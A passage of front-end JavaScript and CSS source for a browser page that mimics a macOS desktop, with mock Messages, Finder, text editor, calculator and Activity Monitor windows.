                
                .message {
                    display: flex;
                    flex-direction: column;
                    max-width: 70%;
                }
                
                .message.received {
                    align-self: flex-start;
                }
                
                .message.sent {
                    align-self: flex-end;
                }
                
                .message-content {
                    padding: 8px 12px;
                    border-radius: 18px;
                    font-size: 14px;
                    line-height: 1.4;
                    word-wrap: break-word;
                }
                
                .message.received .message-content {
                    background: #e5e5e7;
                    color: #1d1d1f;
                }
                
                .message.sent .message-content {
                    background: #007AFF;
                    color: white;
                }
                
                .message-time {
                    font-size: 11px;
                    color: #86868b;
                    margin-top: 4px;
                    align-self: flex-end;
                }
                
                .chat-input-area {
                    padding: 16px;
                    border-top: 1px solid #e5e5e7;
                }
                
                .chat-input-container {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    background: #f5f5f7;
                    border-radius: 20px;
                    padding: 8px 16px;
                }
                
                .chat-input {
                    flex: 1;
                    border: none;
                    background: transparent;
                    outline: none;
                    font-size: 14px;
                    color: #1d1d1f;
                }
                
                .chat-input::placeholder {
                    color: #86868b;
                }
                
                .send-btn {
                    width: 28px;
                    height: 28px;
                    border-radius: 50%;
                    border: none;
                    background: #007AFF;
                    color: white;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 14px;
                    transition: all 0.2s ease;
                }
                
                .send-btn:hover {
                    background: #0056CC;
                    transform: scale(1.1);
                }
                
                .send-btn:disabled {
                    background: #d1d1d6;
                    cursor: not-allowed;
                    transform: none;
                }
            `;
            document.head.appendChild(messagesStyle);
            
            const messageInput = windowEl.querySelector(`#message-input-${id}`);
            const sendBtn = windowEl.querySelector(`#send-btn-${id}`);
            const chatMessages = windowEl.querySelector('.chat-messages');
            
            function sendMessage() {
                const message = messageInput.value.trim();
                if (!message) return;
                
                const messageElement = document.createElement('div');
                messageElement.className = 'message sent';
                messageElement.innerHTML = `
                    <div class="message-content">${message}</div>
                    <div class="message-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
                `;
                
                chatMessages.appendChild(messageElement);
                chatMessages.scrollTop = chatMessages.scrollHeight;
                messageInput.value = '';
                
                setTimeout(() => {
                    const replies = [
                        "That's great!",
                        "I see what you mean.",
                        "Thanks for letting me know!",
                        "Sounds good to me!",
                        "I'll get back to you soon.",
                        "Perfect!",
                        "Got it!"
                    ];
                    const randomReply = replies[Math.floor(Math.random() * replies.length)];
                    
                    const replyElement = document.createElement('div');
                    replyElement.className = 'message received';
                    replyElement.innerHTML = `
                        <div class="message-content">${randomReply}</div>
                        <div class="message-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
                    `;
                    
                    chatMessages.appendChild(replyElement);
                    chatMessages.scrollTop = chatMessages.scrollHeight;
                }, 2000);
            }
            
            sendBtn.addEventListener('click', sendMessage);
            messageInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    sendMessage();
                }
            });
            
            messageInput.addEventListener('input', () => {
                sendBtn.disabled = !messageInput.value.trim();
            });
        }
        
        function openFinder() {
            const id = 'finder';
            if (openWindows.has(id)) {
                bringToFront(openWindows.get(id));
                return;
            }
            
            const content = `
                <div class="finder-app">
                    <div class="finder-toolbar">
                        <div class="toolbar-buttons">
                            <button class="toolbar-btn" title="Back">←</button>
                            <button class="toolbar-btn" title="Forward">→</button>
                            <button class="toolbar-btn" title="Up">↑</button>
                        </div>
                        <div class="path-bar">
                            <span class="path-text">Macintosh HD > ABOELFADLs > ABOELFADL > Desktop</span>
                        </div>
                        <div class="view-buttons">
                            <button class="view-btn active" title="Icon View">⊞</button>
                            <button class="view-btn" title="List View">☰</button>
                            <button class="view-btn" title="Column View">☰</button>
                        </div>
                    </div>
                    <div class="finder-sidebar">
                        <div class="sidebar-section">
                            <div class="sidebar-header">Favorites</div>
                            <div class="sidebar-item active">
                                <span class="sidebar-icon">🏠</span>
                                <span>Home</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">📁</span>
                                <span>Desktop</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">📄</span>
                                <span>Documents</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">⬇️</span>
                                <span>Downloads</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">🎵</span>
                                <span>Music</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">🖼️</span>
                                <span>Pictures</span>
                            </div>
                        </div>
                        <div class="sidebar-section">
                            <div class="sidebar-header">Devices</div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">💾</span>
                                <span>Macintosh HD</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">📱</span>
                                <span>iPhone</span>
                            </div>
                        </div>
                    </div>
                    <div class="finder-content">
                        <div class="content-header">
                            <div class="header-title">Desktop</div>
                            <div class="header-count">8 items</div>
                        </div>
                        <div class="files-grid" id="files-grid-${id}">
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Applications</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Documents</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Downloads</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Music</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Pictures</div>
                            </div>
                            <div class="file-item" data-type="file">
                                <div class="file-icon">📄</div>
                                <div class="file-name">readme.txt</div>
                            </div>
                            <div class="file-item" data-type="file">
                                <div class="file-icon">🖼️</div>
                                <div class="file-name">screenshot.png</div>
                            </div>
                            <div class="file-item" data-type="file">
                                <div class="file-icon">📊</div>
                                <div class="file-name">report.pdf</div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            const windowEl = createWindow(id, 'Finder', content, {minWidth: '100vw', minHeight: '100vh'});
            
            const finderStyle = document.createElement('style');
            finderStyle.textContent = `
                                 .finder-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #ffffff;
                     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                 }
                
                                 .finder-toolbar {
                     display: flex;
                     align-items: center;
                     padding: 12px 16px;
                     border-bottom: 1px solid #d1d1d6;
                     background: #f5f5f7;
                     gap: 12px;
                     height: 44px;
                     box-sizing: border-box;
                 }
                
                .toolbar-buttons {
                    display: flex;
                    gap: 4px;
                }
                
                                 .toolbar-btn {
                     width: 32px;
                     height: 32px;
                     border: 1px solid #d1d1d6;
                     background: #ffffff;
                     border-radius: 6px;
                     cursor: pointer;
                     font-size: 16px;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-weight: 500;
                 }
                
                .toolbar-btn:hover {
                    background: #f0f0f0;
                    border-color: #007AFF;
                }
                
                                 .path-bar {
                     flex: 1;
                     background: #ffffff;
                     border: 1px solid #d1d1d6;
                     border-radius: 8px;
                     padding: 8px 16px;
                     font-size: 13px;
                     color: #1d1d1f;
                     font-weight: 400;
                     min-height: 32px;
                     display: flex;
                     align-items: center;
                 }
                
                .view-buttons {
                    display: flex;
                    gap: 4px;
                }
                
                .view-btn {
                    width: 28px;
                    height: 28px;
                    border: 1px solid #d1d1d6;
                    background: #ffffff;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    transition: all 0.2s ease;
                }
                
                .view-btn.active {
                    background: #007AFF;
                    color: white;
                    border-color: #007AFF;
                }
                
                .view-btn:hover:not(.active) {
                    background: #f0f0f0;
                    border-color: #007AFF;
                }
                
                                 .finder-sidebar {
                     width: 220px;
                     background: #f5f5f7;
                     border-right: 1px solid #d1d1d6;
                     overflow-y: auto;
                     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                 }
                
                .sidebar-section {
                    margin-bottom: 16px;
                }
                
                .sidebar-header {
                    padding: 8px 16px;
                    font-size: 12px;
                    font-weight: 600;
                    color: #86868b;
                    text-transform: uppercase;
                    letter-spacing: 0.5px;
                }
                
                                 .sidebar-item {
                     display: flex;
                     align-items: center;
                     padding: 10px 16px;
                     cursor: pointer;
                     font-size: 13px;
                     color: #1d1d1f;
                     transition: all 0.15s ease;
                     border-radius: 6px;
                     margin: 2px 8px;
                     font-weight: 400;
                 }
                
                .sidebar-item:hover {
                    background-color: rgba(0, 122, 255, 0.1);
                }
                
                                 .sidebar-item.active {
                     background-color: #007AFF;
                     color: white;
                     font-weight: 500;
                 }
                
                .sidebar-icon {
                    margin-right: 8px;
                    font-size: 16px;
                }
                
                .finder-content {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    background: #ffffff;
                }
                
                                 .content-header {
                     display: flex;
                     justify-content: space-between;
                     align-items: center;
                     padding: 16px 20px;
                     border-bottom: 1px solid #d1d1d6;
                     background: #f5f5f7;
                     height: 52px;
                     box-sizing: border-box;
                 }
                
                .header-title {
                    font-size: 14px;
                    font-weight: 600;
                    color: #1d1d1f;
                }
                
                .header-count {
                    font-size: 12px;
                    color: #86868b;
                }
                
                                 .files-grid {
                     flex: 1;
                     padding: 20px;
                     display: grid;
                     grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
                     gap: 20px;
                     overflow-y: auto;
                     background: #ffffff;
                 }
                
                                 .file-item {
                     display: flex;
                     flex-direction: column;
                     align-items: center;
                     padding: 16px 12px;
                     border-radius: 12px;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     text-align: center;
                     border: 2px solid transparent;
                 }
                
                                 .file-item:hover {
                     background-color: rgba(0, 122, 255, 0.08);
                     border-color: rgba(0, 122, 255, 0.2);
                 }
                
                                 .file-item.selected {
                     background-color: #007AFF;
                     color: white;
                     border-color: #007AFF;
                     box-shadow: 0 2px 8px rgba(0, 122, 255, 0.3);
                 }
                
                .file-icon {
                    font-size: 48px;
                    margin-bottom: 8px;
                }
                
                .file-name {
                    font-size: 12px;
                    line-height: 1.3;
                    word-wrap: break-word;
                    max-width: 100px;
                }
                
                .file-item[data-type="folder"] .file-icon {
                    color: #007AFF;
                }
                
                .file-item[data-type="file"] .file-icon {
                    color: #86868b;
                }
                
                .file-item.selected .file-icon {
                    color: white;
                }
            `;
            document.head.appendChild(finderStyle);
            
            const fileItems = windowEl.querySelectorAll('.file-item');
            const sidebarItems = windowEl.querySelectorAll('.sidebar-item');
            
            fileItems.forEach(item => {
                item.addEventListener('click', (e) => {
                    if (e.ctrlKey || e.metaKey) {
                        item.classList.toggle('selected');
                    } else {
                        fileItems.forEach(file => file.classList.remove('selected'));
                        item.classList.add('selected');
                    }
                });
                
                item.addEventListener('dblclick', () => {
                    const fileName = item.querySelector('.file-name').textContent;
                    const fileType = item.dataset.type;
                    
                    if (fileType === 'folder') {
                        console.log(`Opening folder: ${fileName}`);
                    } else {
                        console.log(`Opening file: ${fileName}`);
                    }
                });
            });
            
            sidebarItems.forEach(item => {
                item.addEventListener('click', () => {
                    sidebarItems.forEach(side => side.classList.remove('active'));
                    item.classList.add('active');
                    
                    const location = item.querySelector('span:last-child').textContent;
                    const pathBar = windowEl.querySelector('.path-text');
                    const headerTitle = windowEl.querySelector('.header-title');
                    
                    pathBar.textContent = `Macintosh HD > ABOELFADLs > ABOELFADL > ${location}`;
                    headerTitle.textContent = location;
                });
                         });
         }
         
         function openTextEditor() {
             const id = 'text-editor';
             if (openWindows.has(id)) {
                 bringToFront(openWindows.get(id));
                 return;
             }
             
             const content = `
                 <div class="text-editor-app">
                     <div class="editor-toolbar">
                         <div class="toolbar-group">
                             <button class="toolbar-btn" title="New File" onclick="newFile('${id}')">📄</button>
                             <button class="toolbar-btn" title="Open File" onclick="openFile('${id}')">📂</button>
                             <button class="toolbar-btn" title="Save File" onclick="saveFile('${id}')">💾</button>
                         </div>
                         <div class="toolbar-separator"></div>
                         <div class="toolbar-group">
                             <button class="toolbar-btn" title="Undo" onclick="undo('${id}')">↶</button>
                             <button class="toolbar-btn" title="Redo" onclick="redo('${id}')">↷</button>
                         </div>
                         <div class="toolbar-separator"></div>
                         <div class="toolbar-group">
                             <button class="toolbar-btn" title="Find" onclick="findText('${id}')">🔍</button>
                             <button class="toolbar-btn" title="Replace" onclick="replaceText('${id}')">🔄</button>
                         </div>
                         <div class="toolbar-separator"></div>
                         <div class="toolbar-group">
                             <select class="font-select" onchange="changeFont('${id}', this.value)">
                                 <option value="monospace">Monospace</option>
                                 <option value="Arial">Arial</option>
                                 <option value="Times New Roman">Times New Roman</option>
                                 <option value="Courier New">Courier New</option>
                             </select>
                             <select class="font-size-select" onchange="changeFontSize('${id}', this.value)">
                                 <option value="12">12</option>
                                 <option value="14" selected>14</option>
                                 <option value="16">16</option>
                                 <option value="18">18</option>
                                 <option value="20">20</option>
                             </select>
                         </div>
                     </div>
                     <div class="editor-statusbar">
                         <span class="status-item">Line: <span id="line-count-${id}">1</span></span>
                         <span class="status-item">Column: <span id="col-count-${id}">1</span></span>
                         <span class="status-item">Words: <span id="word-count-${id}">0</span></span>
                         <span class="status-item">Characters: <span id="char-count-${id}">0</span></span>
                     </div>
                     <div class="editor-content">
                         <textarea id="editor-textarea-${id}" class="editor-textarea" placeholder="Start typing your code or text here...">// Welcome to Text Editor
// This is a simple text editor with syntax highlighting

function helloWorld() {
    console.log("Hello, World!");
    return "Welcome to our macOS-like system!";
}

// You can write code, notes, or any text here
// The editor supports basic features like:
// - File operations (New, Open, Save)
// - Find and Replace
// - Font customization
// - Word and character counting

helloWorld();</textarea>
                     </div>
                 </div>
             `;
             
             const windowEl = createWindow(id, 'Text Editor', content, {minWidth: '100vw', minHeight: '100vh'});
             
             const editorStyle = document.createElement('style');
             editorStyle.textContent = `
                 .text-editor-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #1e1e1e;
                     color: #d4d4d4;
                     font-family: -apple-system, BlinkMacSystemFont, 'SF Mono', Monaco, 'Cascadia Code', monospace;
                 }
                 
                 .editor-toolbar {
                     display: flex;
                     align-items: center;
                     padding: 12px 16px;
                     background: #2d2d30;
                     border-bottom: 1px solid #3e3e42;
                     gap: 12px;
                     height: 48px;
                     box-sizing: border-box;
                 }
                 
                 .toolbar-group {
                     display: flex;
                     gap: 4px;
                 }
                 
                 .toolbar-btn {
                     width: 36px;
                     height: 36px;
                     border: 1px solid #3e3e42;
                     background: #3c3c3c;
                     color: #d4d4d4;
                     border-radius: 6px;
                     cursor: pointer;
                     font-size: 16px;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-weight: 500;
                 }
                 
                 .toolbar-btn:hover {
                     background: #4c4c4c;
                     border-color: #007AFF;
                 }
                 
                 .toolbar-separator {
                     width: 1px;
                     height: 24px;
                     background: #3e3e42;
                     margin: 0 4px;
                 }
                 
                 .font-select, .font-size-select {
                     padding: 4px 8px;
                     background: #3c3c3c;
                     border: 1px solid #3e3e42;
                     color: #d4d4d4;
                     border-radius: 4px;
                     font-size: 12px;
                 }
                 
                 .editor-statusbar {
                     display: flex;
                     gap: 20px;
                     padding: 8px 16px;
                     background: #007acc;
                     color: white;
                     font-size: 12px;
                     border-bottom: 1px solid #3e3e42;
                     height: 32px;
                     box-sizing: border-box;
                     align-items: center;
                 }
                 
                 .status-item {
                     display: flex;
                     align-items: center;
                     gap: 4px;
                 }
                 
                 .editor-content {
                     flex: 1;
                     position: relative;
                 }
                 
                 .editor-textarea {
                     width: 100%;
                     height: 100%;
                     background: #1e1e1e;
                     color: #d4d4d4;
                     border: none;
                     outline: none;
                     font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
                     font-size: 14px;
                     line-height: 1.6;
                     padding: 20px;
                     resize: none;
                     tab-size: 4;
                     font-weight: 400;
                 }
                 
                 .editor-textarea::placeholder {
                     color: #6a6a6a;
                 }
             `;
             document.head.appendChild(editorStyle);
             
             const textarea = windowEl.querySelector(`#editor-textarea-${id}`);
             
             function updateStats() {
                 const text = textarea.value;
                 const lines = text.split('\n');
                 const words = text.trim() ? text.trim().split(/\s+/).length : 0;
                 const chars = text.length;
                 
                 windowEl.querySelector(`#line-count-${id}`).textContent = lines.length;
                 windowEl.querySelector(`#word-count-${id}`).textContent = words;
                 windowEl.querySelector(`#char-count-${id}`).textContent = chars;
                 
                 const cursorPos = textarea.selectionStart;
                 const textBeforeCursor = text.substring(0, cursorPos);
                 const linesBeforeCursor = textBeforeCursor.split('\n');
                 const currentLine = linesBeforeCursor.length;
                 const currentCol = linesBeforeCursor[linesBeforeCursor.length - 1].length + 1;
                 
                 windowEl.querySelector(`#col-count-${id}`).textContent = currentCol;
             }
             
             textarea.addEventListener('input', updateStats);
             textarea.addEventListener('click', updateStats);
             textarea.addEventListener('keyup', updateStats);
             
             updateStats();
             
             window.newFile = function(editorId) {
                 if (confirm('Create new file? Unsaved changes will be lost.')) {
                     document.querySelector(`#editor-textarea-${editorId}`).value = '';
                     updateStats();
                 }
             };
             
             window.openFile = function(editorId) {
                 const input = document.createElement('input');
                 input.type = 'file';
                 input.accept = '.txt,.js,.html,.css,.py,.json';
                 input.onchange = function(e) {
                     const file = e.target.files[0];
                     if (file) {
                         const reader = new FileReader();
                         reader.onload = function(e) {
                             document.querySelector(`#editor-textarea-${editorId}`).value = e.target.result;
                             updateStats();
                         };
                         reader.readAsText(file);
                     }
                 };
                 input.click();
             };
             
             window.saveFile = function(editorId) {
                 const text = document.querySelector(`#editor-textarea-${editorId}`).value;
                 const blob = new Blob([text], { type: 'text/plain' });
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
                 a.download = 'document.txt';
                 a.click();
                 URL.revokeObjectURL(url);
             };
             
             window.undo = function(editorId) {
                 document.querySelector(`#editor-textarea-${editorId}`).focus();
                 document.execCommand('undo');
             };
             
             window.redo = function(editorId) {
                 document.querySelector(`#editor-textarea-${editorId}`).focus();
                 document.execCommand('redo');
             };
             
             window.findText = function(editorId) {
                 const searchTerm = prompt('Find text:');
                 if (searchTerm) {
                     const textarea = document.querySelector(`#editor-textarea-${editorId}`);
                     const text = textarea.value;
                     const index = text.indexOf(searchTerm);
                     if (index !== -1) {
                         textarea.focus();
                         textarea.setSelectionRange(index, index + searchTerm.length);
                     } else {
                         alert('Text not found');
                     }
                 }
             };
             
             window.replaceText = function(editorId) {
                 const findTerm = prompt('Find:');
                 if (findTerm) {
                     const replaceTerm = prompt('Replace with:');
                     if (replaceTerm !== null) {
                         const textarea = document.querySelector(`#editor-textarea-${editorId}`);
                         const text = textarea.value;
                         const newText = text.replace(new RegExp(findTerm, 'g'), replaceTerm);
                         textarea.value = newText;
                         updateStats();
                     }
                 }
             };
             
             window.changeFont = function(editorId, font) {
                 document.querySelector(`#editor-textarea-${editorId}`).style.fontFamily = font;
             };
             
             window.changeFontSize = function(editorId, size) {
                 document.querySelector(`#editor-textarea-${editorId}`).style.fontSize = size + 'px';
             };
         }
         
         function openCalculator() {
             const id = 'calculator';
             if (openWindows.has(id)) {
                 bringToFront(openWindows.get(id));
                 return;
             }
             
             const content = `
                 <div class="calculator-app">
                     <div class="calculator-display">
                         <div class="display-history" id="calc-history-${id}"></div>
                         <div class="display-current" id="calc-current-${id}">0</div>
                     </div>
                     <div class="calculator-buttons">
                         <div class="button-row">
                             <button class="calc-btn function" onclick="calcFunction('${id}', 'clear')">AC</button>
                             <button class="calc-btn function" onclick="calcFunction('${id}', 'plusMinus')">±</button>
                             <button class="calc-btn function" onclick="calcFunction('${id}', 'percent')">%</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '÷')">÷</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number" onclick="calcNumber('${id}', '7')">7</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '8')">8</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '9')">9</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '×')">×</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number" onclick="calcNumber('${id}', '4')">4</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '5')">5</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '6')">6</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '-')">−</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number" onclick="calcNumber('${id}', '1')">1</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '2')">2</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '3')">3</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '+')">+</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number zero" onclick="calcNumber('${id}', '0')">0</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '.')">.</button>
                             <button class="calc-btn equals" onclick="calcEquals('${id}')">=</button>
                         </div>
                     </div>
                 </div>
             `;
             
             const windowEl = createWindow(id, 'Calculator', content, {minWidth: '320px', minHeight: '500px'});
             
             const calcStyle = document.createElement('style');
             calcStyle.textContent = `
                 .calculator-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #000000;
                     color: white;
                     font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
                 }
                 
                 .calculator-display {
                     flex: 1;
                     display: flex;
                     flex-direction: column;
                     justify-content: flex-end;
                     padding: 24px;
                     background: #000000;
                     min-height: 200px;
                 }
                 
                 .display-history {
                     font-size: 24px;
                     color: #8e8e93;
                     text-align: right;
                     margin-bottom: 8px;
                     min-height: 30px;
                 }
                 
                 .display-current {
                     font-size: 72px;
                     font-weight: 300;
                     text-align: right;
                     line-height: 1;
                     font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .calculator-buttons {
                     display: flex;
                     flex-direction: column;
                     gap: 1px;
                     background: #000000;
                 }
                 
                 .button-row {
                     display: flex;
                     gap: 1px;
                 }
                 
                 .calc-btn {
                     flex: 1;
                     height: 88px;
                     border: none;
                     font-size: 36px;
                     font-weight: 400;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .calc-btn.number {
                     background: #333333;
                     color: white;
                 }
                 
                 .calc-btn.number:hover {
                     background: #666666;
                 }
                 
                 .calc-btn.number:active {
                     background: #999999;
                 }
                 
                 .calc-btn.operator {
                     background: #ff9500;
                     color: white;
                 }
                 
                 .calc-btn.operator:hover {
                     background: #ffaa33;
                 }
                 
                 .calc-btn.operator:active {
                     background: #ffcc66;
                 }
                 
                 .calc-btn.function {
                     background: #a5a5a5;
                     color: black;
                 }
                 
                 .calc-btn.function:hover {
                     background: #cccccc;
                 }
                 
                 .calc-btn.function:active {
                     background: #e6e6e6;
                 }
                 
                 .calc-btn.equals {
                     background: #ff9500;
                     color: white;
                 }
                 
                 .calc-btn.equals:hover {
                     background: #ffaa33;
                 }
                 
                 .calc-btn.equals:active {
                     background: #ffcc66;
                 }
                 
                 .calc-btn.zero {
                     flex: 2;
                     justify-content: flex-start;
                     padding-left: 32px;
                 }
             `;
             document.head.appendChild(calcStyle);
             
             let calcState = {
                 current: '0',
                 previous: null,
                 operation: null,
                 waitingForOperand: false
             };
             
             window.calcNumber = function(calcId, num) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 
                 if (calcState.waitingForOperand) {
                     calcState.current = num;
                     calcState.waitingForOperand = false;
                 } else {
                     if (num === '.' && calcState.current.includes('.')) return;
                     if (calcState.current === '0' && num !== '.') {
                         calcState.current = num;
                     } else {
                         calcState.current += num;
                     }
                 }
                 
                 currentDisplay.textContent = calcState.current;
             };
             
             window.calcOperator = function(calcId, operator) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 const historyDisplay = document.querySelector(`#calc-history-${calcId}`);
                 
                 const inputValue = parseFloat(calcState.current);
                 
                 if (calcState.previous === null) {
                     calcState.previous = inputValue;
                 } else if (calcState.operation) {
                     const result = performCalculation(calcState.previous, inputValue, calcState.operation);
                     calcState.current = String(result);
                     calcState.previous = result;
                     currentDisplay.textContent = calcState.current;
                 }
                 
                 calcState.waitingForOperand = true;
                 calcState.operation = operator;
                 historyDisplay.textContent = `${calcState.previous} ${operator}`;
             };
             
             window.calcEquals = function(calcId) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 const historyDisplay = document.querySelector(`#calc-history-${calcId}`);
                 
                 const inputValue = parseFloat(calcState.current);
                 
                 if (calcState.previous === null || calcState.operation === null) {
                     return;
                 }
                 
                 const result = performCalculation(calcState.previous, inputValue, calcState.operation);
                 calcState.current = String(result);
                 calcState.previous = null;
                 calcState.operation = null;
                 calcState.waitingForOperand = false;
                 
                 currentDisplay.textContent = calcState.current;
                 historyDisplay.textContent = '';
             };
             
             window.calcFunction = function(calcId, func) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 const historyDisplay = document.querySelector(`#calc-history-${calcId}`);
                 
                 switch (func) {
                     case 'clear':
                         calcState.current = '0';
                         calcState.previous = null;
                         calcState.operation = null;
                         calcState.waitingForOperand = false;
                         historyDisplay.textContent = '';
                         break;
                     case 'plusMinus':
                         calcState.current = String(-parseFloat(calcState.current));
                         break;
                     case 'percent':
                         calcState.current = String(parseFloat(calcState.current) / 100);
                         break;
                 }
                 
                 currentDisplay.textContent = calcState.current;
             };
             
             function performCalculation(previous, current, operation) {
                 switch (operation) {
                     case '+': return previous + current;
                     case '-': return previous - current;
                     case '×': return previous * current;
                     case '÷': return previous / current;
                     default: return current;
                 }
             }
         }
         
         function openTaskManager() {
             const id = 'task-manager';
             if (openWindows.has(id)) {
                 bringToFront(openWindows.get(id));
                 return;
             }
             
             const content = `
                 <div class="task-manager-app">
                     <div class="task-manager-header">
                         <h3>Activity Monitor</h3>
                         <div class="system-stats">
                             <div class="stat-item">
                                 <span class="stat-label">CPU:</span>
                                 <span class="stat-value" id="cpu-usage-${id}">12%</span>
                             </div>
                             <div class="stat-item">
                                 <span class="stat-label">Memory:</span>
                                 <span class="stat-value" id="memory-usage-${id}">4.2 GB</span>
                             </div>
                             <div class="stat-item">
                                 <span class="stat-label">Disk:</span>
                                 <span class="stat-value" id="disk-usage-${id}">128 GB</span>
                             </div>
                         </div>
                     </div>
                     <div class="task-manager-tabs">
                         <button class="tab-btn active" onclick="switchTab('${id}', 'cpu')">CPU</button>
                         <button class="tab-btn" onclick="switchTab('${id}', 'memory')">Memory</button>
                         <button class="tab-btn" onclick="switchTab('${id}', 'disk')">Disk</button>
                         <button class="tab-btn" onclick="switchTab('${id}', 'network')">Network</button>
                     </div>
                     <div class="task-manager-content">
                         <div class="process-list" id="process-list-${id}">
                             <div class="process-header">
                                 <span class="process-name">Process Name</span>
                                 <span class="process-cpu">CPU %</span>
                                 <span class="process-memory">Memory</span>
                                 <span class="process-status">Status</span>
                                 <span class="process-actions">Actions</span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Finder</span>
                                 <span class="process-cpu">2.1%</span>
                                 <span class="process-memory">45.2 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Finder')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Safari</span>
                                 <span class="process-cpu">8.5%</span>
                                 <span class="process-memory">156.7 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Safari')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Terminal</span>
                                 <span class="process-cpu">1.2%</span>
                                 <span class="process-memory">12.8 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Terminal')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Messages</span>
                                 <span class="process-cpu">0.8%</span>
                                 <span class="process-memory">28.4 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Messages')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Settings</span>
                                 <span class="process-cpu">0.5%</span>
                                 <span class="process-memory">15.6 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Settings')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Notes</span>
                                 <span class="process-cpu">0.3%</span>
                                 <span class="process-memory">22.1 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Notes')">End</button>
                                 </span>
                             </div>
                         </div>
                     </div>
                 </div>
             `;
             
             const windowEl = createWindow(id, 'Activity Monitor', content, {minWidth: '700px', minHeight: '500px'});
             
             const taskManagerStyle = document.createElement('style');
             taskManagerStyle.textContent = `
                 .task-manager-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #ffffff;
                     font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
                 }
                 
                 .task-manager-header {
                     padding: 20px;
                     border-bottom: 1px solid #d1d1d6;
                     background: #f5f5f7;
                     height: 80px;
                     box-sizing: border-box;
                     display: flex;
                     flex-direction: column;
                     justify-content: center;
                 }
                 
                 .task-manager-header h3 {
                     margin: 0 0 16px 0;
                     font-size: 18px;
                     font-weight: 600;
                     color: #1d1d1f;
                     font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .system-stats {
                     display: flex;
                     gap: 24px;
